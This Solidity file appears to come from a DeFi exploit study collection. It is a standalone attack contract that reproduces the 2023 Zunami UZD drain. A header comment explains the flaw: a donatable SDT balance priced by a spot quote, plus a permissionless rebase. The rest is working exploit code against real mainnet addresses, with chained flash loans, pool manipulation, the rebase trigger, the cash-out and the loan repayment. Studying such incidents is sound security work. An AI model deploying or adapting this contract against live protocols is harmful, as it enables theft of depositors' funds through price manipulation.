// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "./../interface.sol";

// Synthetic standalone exploit for the EVM Playground (2023-08-Zunami).
//
// The DeFiHackLabs PoC runs the whole attack INLINE in Foundry's ContractTest
// harness (the Uniswap V3 flash callback, the Balancer flash callback, and the
// Curve/Sushi swap sequence all live on the test contract itself, using
// address(this) throughout) -- there is no standalone attack contract to
// deploy. This file is a faithful, cheatcode-free copy of that inline attack:
// no vm.*, no forge-std logging, no Test inheritance. Logic, addresses and
// swap amounts are copied verbatim from test/Zunami_exp.sol.
//
// Root cause: Zunami's UZD is a rebasing stablecoin whose per-share price
// (lpPrice) is the sum of every underlying strategy's totalHoldings() divided
// by supply. The MIMCurveStakeDao strategy values its accrued SDT rewards by
// pricing `sdtEarned + sdt.balanceOf(address(this))` (a DONATABLE raw ERC20
// balance) through a live SushiSwap spot quote (getAmountsOut, no TWAP). The
// attacker donates cheaply-bought SDT into the strategy, drains the SDT side
// of the thin Sushi SDT/WETH pool so the spot quote massively overprices the
// donated SDT, then calls the permissionless, same-block UZD.cacheAssetPrice()
// to ratchet the rebase price up 3.47x while already holding UZD -- minting
// value out of thin air -- and cashes the inflated UZD out through Curve.
interface IUZD is IERC20 {
    function cacheAssetPrice() external;
}

interface ICurve {
    function exchange(
        uint256 i,
        uint256 j,
        uint256 dx,
        uint256 min_dy,
        bool use_eth,
        address receiver
    ) external returns (uint256);
}

contract ZunamiUZDDrain {
    IUZD constant UZD = IUZD(0xb40b6608B2743E691C9B54DdBDEe7bf03cd79f1c);
    IERC20 constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 constant crvUSD = IERC20(0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E);
    IERC20 constant crvFRAX = IERC20(0x3175Df0976dFA876431C2E9eE6Bc45b65d3473CC);
    IERC20 constant USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 constant SDT = IERC20(0x73968b9a57c6E53d41345FD57a6E6ae27d6CDB2F);
    IERC20 constant FRAX = IERC20(0x853d955aCEf822Db058eb8505911ED77F175b99e);
    ICurvePool constant FRAX_USDC_POOL = ICurvePool(0xDcEF968d416a41Cdac0ED8702fAC8128A64241A2);
    ICurvePool constant UZD_crvFRAX_POOL = ICurvePool(0x68934F60758243eafAf4D2cFeD27BF8010bede3a);
    ICurvePool constant crvUSD_USDC_POOL = ICurvePool(0x4DEcE678ceceb27446b35C672dC7d61F30bAD69E);
    ICurvePool constant crvUSD_UZD_POOL = ICurvePool(0xfC636D819d1a98433402eC9dEC633d864014F28C);
    ICurvePool constant Curve3POOL = ICurvePool(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);
    ICurve constant ETH_SDT_POOL = ICurve(0xfB8814D005C5f32874391e888da6eB2fE7a27902);
    Uni_Router_V2 constant sushiRouter = Uni_Router_V2(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
    Uni_Pair_V3 constant USDC_WETH_Pair = Uni_Pair_V3(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640);
    Uni_Pair_V3 constant USDC_USDT_Pair = Uni_Pair_V3(0x3416cF6C708Da44DB2624D63ea0AAef7113527C6);
    IBalancerVault constant Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    address constant MIMCurveStakeDao = 0x9848EDb097Bee96459dFf7609fb582b80A8F8EfD;

    // Entry point: flash-borrow 7,000,000 USDT-equivalent from the Uniswap V3
    // USDC/USDT pair. The callback below draws a second flash loan from
    // Balancer and runs the whole attack.
    function testExploit() external {
        USDC_USDT_Pair.flash(address(this), 0, 7_000_000 * 1e6, abi.encode(7_000_000 * 1e6));
        // Profit (WETH + USDT) is left sitting in this contract's own balance --
        // measured externally, mirroring the original inline test's address(this).
    }

    // Uniswap V3 flash callback (fee0, fee1, data).
    function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {
        BalancerFlashLoan();

        uint256 amount = abi.decode(data, (uint256));
        TransferHelper.safeTransfer(address(USDT), address(USDC_USDT_Pair), amount1 + amount);
    }

    function BalancerFlashLoan() internal {
        address[] memory tokens = new address[](2);
        tokens[0] = address(USDC);
        tokens[1] = address(WETH);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 7_000_000 * 1e6;
        amounts[1] = 10_011 ether;
        bytes memory userData = "";
        Balancer.flashLoan(address(this), tokens, amounts, userData);
    }

    // Balancer flash-loan callback -- the whole attack lives here.
    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external {
        apporveAll();

        // Step 1: mint UZD via Curve (USDC -> crvFRAX -> UZD, USDC -> crvUSD -> UZD).
        uint256[2] memory amount;
        amount[0] = 0;
        amount[1] = 5_750_000 * 1e6;
        uint256 crvFRAXBalance = FRAX_USDC_POOL.add_liquidity(amount, 0); // mint crvFRAX

        UZD_crvFRAX_POOL.exchange(1, 0, crvFRAXBalance, 0, address(this)); // swap crvFRAX to UZD

        crvUSD_USDC_POOL.exchange(0, 1, 1_250_000 * 1e6, 0, address(this)); // swap USDC to crvUSD

        crvUSD_UZD_POOL.exchange(1, 0, crvUSD.balanceOf(address(this)), 0, address(this)); // swap crvUSD to UZD

        // Step 2: buy SDT cheaply on the Curve ETH/SDT pool.
        ETH_SDT_POOL.exchange(0, 1, 11 ether, 0, false, address(this)); // swap WETH to SDT

        // @Vulnerability: UZD.balanceOf() is driven by totalHoldings(), which
        // prices the MIMCurveStakeDao strategy's SDT via a live Sushi spot
        // quote over `sdtEarned + sdt.balanceOf(strategy)` -- both of those
        // inputs are attacker-controlled (see below).
        SDT.transfer(MIMCurveStakeDao, SDT.balanceOf(address(this))); // donate SDT to MIMCurveStakeDao, inflate its "value"

        // Step 3: thin the Sushi SDT/WETH pool so the donated SDT prices absurdly high.
        swapToken1Totoken2(WETH, SDT, 10_000 ether); // swap WETH to SDT by sushi router
        uint256 value = swapToken1Totoken2(USDT, WETH, 7_000_000 * 1e6); // swap USDT to WETH by sushi router

        // Step 4: permissionlessly rebase UZD -- lpPrice ratchets up ~3.47x.
        UZD.cacheAssetPrice(); // rebase UZD balance

        // Step 5: unwind the Sushi pool and cash out the now-inflated UZD.
        swapToken1Totoken2(SDT, WETH, SDT.balanceOf(address(this))); // swap SDT to WETH
        swapToken1Totoken2(WETH, USDT, value); // swap WETH to USDT

        UZD_crvFRAX_POOL.exchange(0, 1, UZD.balanceOf(address(this)) * 84 / 100, 0, address(this)); // swap UZD to crvFRAX

        crvUSD_UZD_POOL.exchange(0, 1, UZD.balanceOf(address(this)), 0, address(this)); // swap UZD to crvUSD

        FRAX_USDC_POOL.remove_liquidity(crvFRAX.balanceOf(address(this)), [uint256(0), uint256(0)]); // burn crvFRAX

        FRAX_USDC_POOL.exchange(0, 1, FRAX.balanceOf(address(this)), 0); // swap FRAX to USDC

        crvUSD_USDC_POOL.exchange(1, 0, crvUSD.balanceOf(address(this)), 0, address(this)); // swap crvUSD to USDC

        Curve3POOL.exchange(1, 2, 25_920 * 1e6, 0); // swap USDC to USDT

        // Step 6: repay both flash loans, keeping the surplus WETH + USDT as profit.
        uint256 swapAmount = USDC.balanceOf(address(this)) - amounts[0];
        USDC_WETH_Pair.swap(address(this), true, int256(swapAmount), 920_316_691_481_336_325_637_286_800_581_326, ""); // swap USDC to WETH

        IERC20(tokens[0]).transfer(msg.sender, amounts[0] + feeAmounts[0]);
        IERC20(tokens[1]).transfer(msg.sender, amounts[1] + feeAmounts[1]);
    }

    function apporveAll() internal {
        USDC.approve(address(FRAX_USDC_POOL), type(uint256).max);
        crvFRAX.approve(address(UZD_crvFRAX_POOL), type(uint256).max);
        UZD.approve(address(UZD_crvFRAX_POOL), type(uint256).max);
        USDC.approve(address(crvUSD_USDC_POOL), type(uint256).max);
        crvUSD.approve(address(crvUSD_USDC_POOL), type(uint256).max);
        crvUSD.approve(address(crvUSD_UZD_POOL), type(uint256).max);
        UZD.approve(address(crvUSD_UZD_POOL), type(uint256).max);
        WETH.approve(address(ETH_SDT_POOL), type(uint256).max);
        USDC.approve(address(Curve3POOL), type(uint256).max);
        USDC.approve(address(USDC_WETH_Pair), type(uint256).max);
        WETH.approve(address(sushiRouter), type(uint256).max);
        SDT.approve(address(sushiRouter), type(uint256).max);
        TransferHelper.safeApprove(address(USDT), address(sushiRouter), type(uint256).max);
        FRAX.approve(address(FRAX_USDC_POOL), type(uint256).max);
    }

    function swapToken1Totoken2(IERC20 token1, IERC20 token2, uint256 amountIn) internal returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = address(token1);
        path[1] = address(token2);
        uint256[] memory values =
            sushiRouter.swapExactTokensForTokens(amountIn, 0, path, address(this), block.timestamp);
        return values[1];
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256, bytes calldata) external {
        USDC.transfer(msg.sender, uint256(amount0Delta));
    }
}
